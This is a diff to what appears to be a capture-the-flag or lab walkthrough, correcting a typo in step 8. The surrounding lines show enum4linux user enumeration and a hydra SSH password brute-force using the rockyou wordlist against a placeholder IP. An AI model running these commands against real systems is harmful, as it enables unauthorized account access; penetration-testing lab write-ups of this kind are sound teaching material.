@@ -38,7 +38,7 @@
 ### • 7. To know the user names we will use enum4linux :
     enum4linux -a >IP<
 
-### • 8. After getting the usernames we have to try for cracking the password { note that we ar e in ssh service } :
+### • 8. After getting the usernames we have to try for cracking the password { note that we are in ssh service } :
     hydra -l >username< -P /usr/share/wordlists/rockyou.txt ssh://>IP< -V 
  -l ⇨ for user </br>
  -P ⇨ for password wordlist </br>
